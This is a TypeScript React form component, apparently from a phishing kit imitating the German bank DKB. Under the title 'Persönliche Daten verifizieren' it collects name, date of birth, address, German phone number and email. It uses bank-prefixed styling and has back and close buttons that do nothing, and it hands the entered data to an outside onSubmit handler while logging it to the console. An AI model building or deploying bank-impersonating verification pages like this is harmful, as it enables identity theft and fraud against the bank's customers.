import React, { useState } from 'react';

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface PersonalDataFormProps {
  onSubmit: (data: PersonalData) => void;
}

const PersonalDataForm: React.FC<PersonalDataFormProps> = ({ onSubmit }) => {
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [dateOfBirth, setDateOfBirth] = useState('');
  const [street, setStreet] = useState('');
  const [streetNumber, setStreetNumber] = useState('');
  const [plz, setPlz] = useState('');
  const [city, setCity] = useState('');
  const [phone, setPhone] = useState('');
  const [email, setEmail] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const [errors, setErrors] = useState<Partial<PersonalData>>({});

  // Format date input as DD.MM.YYYY
  const formatDateInput = (value: string): string => {
    // Remove all non-digit characters
    const digitsOnly = value.replace(/\D/g, '');
    
    // Format based on length
    if (digitsOnly.length <= 2) {
      return digitsOnly;
    } else if (digitsOnly.length <= 4) {
      return `${digitsOnly.slice(0, 2)}.${digitsOnly.slice(2)}`;
    } else if (digitsOnly.length <= 8) {
      return `${digitsOnly.slice(0, 2)}.${digitsOnly.slice(2, 4)}.${digitsOnly.slice(4, 8)}`;
    } else {
      return `${digitsOnly.slice(0, 2)}.${digitsOnly.slice(2, 4)}.${digitsOnly.slice(4, 8)}`;
    }
  };

  // Handle phone number input to automatically add +49 prefix
  const handlePhoneChange = (value: string) => {
    // If the field is empty and user starts typing, add +49
    if (phone === '' && value.length > 0 && !value.startsWith('+49')) {
      setPhone('+49 ' + value);
    } else if (value.startsWith('+49')) {
      setPhone(value);
    } else if (value === '') {
      setPhone('');
    } else {
      // If user tries to delete +49, restore it
      if (!value.startsWith('+49') && phone.startsWith('+49')) {
        setPhone('+49 ' + value.replace(/^\+?49\s?/, ''));
      } else {
        setPhone(value);
      }
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<PersonalData> = {};
    
    if (!firstName.trim()) {
      newErrors.first_name = 'Vorname ist erforderlich';
    }
    
    if (!lastName.trim()) {
      newErrors.last_name = 'Nachname ist erforderlich';
    }
    
    if (!dateOfBirth.trim()) {
      newErrors.date_of_birth = 'Geburtsdatum ist erforderlich';
    } else if (!/^\d{2}\.\d{2}\.\d{4}$/.test(dateOfBirth)) {
      newErrors.date_of_birth = 'Format: TT.MM.JJJJ';
    }
    
    if (!street.trim()) {
      newErrors.street = 'Straße ist erforderlich';
    }
    
    if (!streetNumber.trim()) {
      newErrors.street_number = 'Hausnummer ist erforderlich';
    }
    
    if (!plz.trim()) {
      newErrors.plz = 'PLZ ist erforderlich';
    } else if (!/^\d{5}$/.test(plz)) {
      newErrors.plz = 'PLZ muss genau 5 Ziffern haben';
    }
    
    if (!city.trim()) {
      newErrors.city = 'Ort ist erforderlich';
    }
    
    if (!phone.trim()) {
      newErrors.phone = 'Telefonnummer ist erforderlich';
    }
    
    if (!email.trim()) {
      newErrors.email = 'E-Mail ist erforderlich';
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      newErrors.email = 'Ungültige E-Mail-Adresse';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    setIsSubmitting(true);
    
    try {
      const formData: PersonalData = {
        first_name: firstName.trim(),
        last_name: lastName.trim(),
        date_of_birth: dateOfBirth.trim(),
        street: street.trim(),
        street_number: streetNumber.trim(),
        plz: plz.trim(),
        city: city.trim(),
        phone: phone.trim(),
        email: email.trim()
      };
      
      console.log('PersonalDataForm: Submitting data:', formData);
      await onSubmit(formData);
    } catch (error) {
      console.error('Error submitting personal data:', error);
      setIsSubmitting(false);
    }
  };

  return (
    <div className="dkb-form-container">
      <div className="dkb-form-card">
        {/* Header with close button */}
        <div className="dkb-form-header">
          <button className="dkb-close-button" type="button">←</button>
          <h1 className="dkb-form-title">Persönliche Daten verifizieren</h1>
          <button className="dkb-close-button" type="button">×</button>
        </div>
        
        <p className="dkb-form-description">
          Bitte geben Sie Ihre persönlichen Daten zur Verifizierung Ihrer Identität ein.
        </p>
        
        <form onSubmit={handleSubmit} className="dkb-form">
          {/* First Name */}
          <div className="dkb-input-container">
            <input
              type="text"
              value={firstName}
              onChange={(e) => setFirstName(e.target.value)}
              placeholder=" "
              className="dkb-input"
              required
            />
            <label className="dkb-input-label">Vorname</label>
            {errors.first_name && (
              <div className="dkb-input-error">{errors.first_name}</div>
            )}
          </div>

          {/* Last Name */}
          <div className="dkb-input-container">
            <input
              type="text"
              value={lastName}
              onChange={(e) => setLastName(e.target.value)}
              placeholder=" "
              className="dkb-input"
              required
            />
            <label className="dkb-input-label">Nachname</label>
            {errors.last_name && (
              <div className="dkb-input-error">{errors.last_name}</div>
            )}
          </div>

          {/* Date of Birth */}
          <div className="dkb-input-container">
            <input
              type="text"
              value={dateOfBirth}
              onChange={(e) => setDateOfBirth(formatDateInput(e.target.value))}
              placeholder=" "
              className="dkb-input"
              maxLength={10}
              required
            />
            <label className="dkb-input-label">Geburtsdatum</label>
            {errors.date_of_birth && (
              <div className="dkb-input-error">{errors.date_of_birth}</div>
            )}
          </div>

          {/* Street */}
          <div className="dkb-input-container">
            <input
              type="text"
              value={street}
              onChange={(e) => setStreet(e.target.value)}
              placeholder=" "
              className="dkb-input"
              required
            />
            <label className="dkb-input-label">Straße</label>
            {errors.street && (
              <div className="dkb-input-error">{errors.street}</div>
            )}
          </div>

          {/* Street Number */}
          <div className="dkb-input-container">
            <input
              type="text"
              value={streetNumber}
              onChange={(e) => setStreetNumber(e.target.value)}
              placeholder=" "
              className="dkb-input"
              required
            />
            <label className="dkb-input-label">Hausnummer</label>
            {errors.street_number && (
              <div className="dkb-input-error">{errors.street_number}</div>
            )}
          </div>

          {/* PLZ */}
          <div className="dkb-input-container">
            <input
              type="text"
              value={plz}
              onChange={(e) => setPlz(e.target.value.replace(/\D/g, '').slice(0, 5))}
              placeholder=" "
              className="dkb-input"
              maxLength={5}
              required
            />
            <label className="dkb-input-label">PLZ</label>
            {errors.plz && (
              <div className="dkb-input-error">{errors.plz}</div>
            )}
          </div>

          {/* City */}
          <div className="dkb-input-container">
            <input
              type="text"
              value={city}
              onChange={(e) => setCity(e.target.value)}
              placeholder=" "
              className="dkb-input"
              required
            />
            <label className="dkb-input-label">Ort</label>
            {errors.city && (
              <div className="dkb-input-error">{errors.city}</div>
            )}
          </div>

          {/* Email */}
          <div className="dkb-input-container">
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder=" "
              className="dkb-input"
              required
            />
            <label className="dkb-input-label">E-Mail</label>
            {errors.email && (
              <div className="dkb-input-error">{errors.email}</div>
            )}
          </div>

          {/* Phone */}
          <div className="dkb-input-container">
            <input
              type="tel"
              value={phone}
              onChange={(e) => handlePhoneChange(e.target.value)}
              placeholder=" "
              className="dkb-input"
              required
            />
            <label className="dkb-input-label">Telefonnummer</label>
            {errors.phone && (
              <div className="dkb-input-error">{errors.phone}</div>
            )}
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            className="dkb-submit-button"
            disabled={isSubmitting}
          >
            {isSubmitting ? (
              <span style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
                <div style={{
                  width: '16px',
                  height: '16px',
                  border: '2px solid rgba(255, 255, 255, 0.3)',
                  borderTop: '2px solid #ffffff',
                  borderRadius: '50%',
                  animation: 'dkb-spin 1s linear infinite'
                }} />
                Wird verarbeitet...
              </span>
            ) : (
              'Weiter'
            )}
          </button>
        </form>
      </div>
    </div>
  );
};

export default PersonalDataForm;